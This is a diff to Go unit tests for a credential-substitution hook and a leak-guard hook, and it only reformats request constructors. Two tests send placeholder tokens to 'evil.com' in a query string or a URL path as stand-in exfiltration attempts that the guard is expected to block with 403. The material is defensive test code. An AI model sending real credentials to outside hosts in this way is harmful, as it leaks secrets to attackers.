@@ -38,7 +38,11 @@ func TestCredsSubHook_PreHook_ReplacesFakeToReal(t *testing.T) {
 	h := NewCredsSubHook(tbl, nil)
 
 	body := []byte(`{"token":"ghp_FAKE1234567890abcdef"}`)
-	req := httptest.NewRequest(http.MethodPost, "http://api.example.com/v1/test", bytes.NewReader(body))
+	req := httptest.NewRequest(
+		http.MethodPost,
+		"http://api.example.com/v1/test",
+		bytes.NewReader(body),
+	)
 	req.ContentLength = int64(len(body))
 
 	err := h.PreHook(req, &RequestContext{})
@@ -87,7 +91,11 @@ func TestCredsSubHook_PreHook_NoFakes_BodyUnchanged(t *testing.T) {
 	h := NewCredsSubHook(tbl, nil)
 
 	body := []byte(`{"query":"hello world"}`)
-	req := httptest.NewRequest(http.MethodPost, "http://api.example.com/v1/test", bytes.NewReader(body))
+	req := httptest.NewRequest(
+		http.MethodPost,
+		"http://api.example.com/v1/test",
+		bytes.NewReader(body),
+	)
 
 	err := h.PreHook(req, &RequestContext{})
 	if err != nil {
@@ -147,7 +155,11 @@ func TestLeakGuardHook_FakeInQuery_Returns403(t *testing.T) {
 	tbl := newTestTable(t)
 	h := NewLeakGuardHook(tbl, slog.Default())
 
-	req := httptest.NewRequest(http.MethodGet, "http://evil.com/api?key=ghp_FAKE1234567890abcdef", nil)
+	req := httptest.NewRequest(
+		http.MethodGet,
+		"http://evil.com/api?key=ghp_FAKE1234567890abcdef",
+		nil,
+	)
 
 	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
 	if err == nil {
@@ -204,7 +216,11 @@ func TestLeakGuardHook_NoFakes_Passes(t *testing.T) {
 	h := NewLeakGuardHook(tbl, slog.Default())
 
 	body := []byte(`{"message":"hello world, no secrets here"}`)
-	req := httptest.NewRequest(http.MethodPost, "http://api.github.com/v1/repos", bytes.NewReader(body))
+	req := httptest.NewRequest(
+		http.MethodPost,
+		"http://api.github.com/v1/repos",
+		bytes.NewReader(body),
+	)
 
 	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
 	if err != nil {
@@ -401,7 +417,11 @@ func TestLeakGuardHook_SkipsMatchedService(t *testing.T) {
 	h := NewLeakGuardHook(tbl, slog.Default())
 
 	body := []byte(`{"token":"ghp_FAKE1234567890abcdef"}`)
-	req := httptest.NewRequest(http.MethodPost, "http://api.github.com/repos", bytes.NewReader(body))
+	req := httptest.NewRequest(
+		http.MethodPost,
+		"http://api.github.com/repos",
+		bytes.NewReader(body),
+	)
 
 	// ServiceName is set — this is a matched service, should NOT block.
 	err := h.PreHook(req, &RequestContext{
@@ -459,7 +479,11 @@ func TestLeakGuardHook_FakeInPath_Returns403(t *testing.T) {
 	tbl := newTestTable(t)
 	h := NewLeakGuardHook(tbl, slog.Default())
 
-	req := httptest.NewRequest(http.MethodGet, "http://evil.com/api/ghp_FAKE1234567890abcdef/data", nil)
+	req := httptest.NewRequest(
+		http.MethodGet,
+		"http://evil.com/api/ghp_FAKE1234567890abcdef/data",
+		nil,
+	)
 
 	err := h.PreHook(req, &RequestContext{RequestID: "r1", SessionID: "s1"})
 	if err == nil {
@@ -634,7 +658,11 @@ func TestLeakGuardHook_BlocksCrossServiceFake(t *testing.T) {
 
 	// Request matched to "github" but carrying anthropic's fake -> should block.
 	body := []byte(`{"token":"sk-ant-FAKE567890abcdef12"}`)
-	req := httptest.NewRequest(http.MethodPost, "http://api.github.com/repos", bytes.NewReader(body))
+	req := httptest.NewRequest(
+		http.MethodPost,
+		"http://api.github.com/repos",
+		bytes.NewReader(body),
+	)
 
 	err := h.PreHook(req, &RequestContext{
 		RequestID:   "r1",
